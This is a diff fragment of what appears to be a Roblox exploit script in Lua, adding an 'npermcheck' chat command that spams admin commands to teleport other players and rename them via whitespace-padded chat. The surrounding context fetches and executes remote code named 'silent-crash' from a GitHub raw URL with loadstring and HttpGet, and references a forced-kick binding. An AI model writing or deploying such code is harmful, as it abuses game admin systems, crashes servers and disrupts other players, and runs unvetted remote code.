@@ -699,6 +699,15 @@ loopping = false
 loadstring(game:HttpGet("https://raw.githubusercontent.com/lpkonizopcinfasdf/plamka/main/my_own/silent-crash",true))()
 	end
 
+	if string.sub(msg:lower(), 0, 11) == prefix.."npermcheck" then
+game.Players:Chat("-reg")
+wait(.25)
+game.Players:Chat("tp                                                 others me")
+game.Players:Chat("name admins I have perm admin !")
+wait(1)
+game.Players:Chat("unname                                                                               /all/all /")
+	end
+
 	
 	if string.sub(msg:lower(), 0, 11) == prefix.."bind fkick" then
 		logn("fkick is now bound to '"..string.sub(msg:lower(), 13, 13).."'")
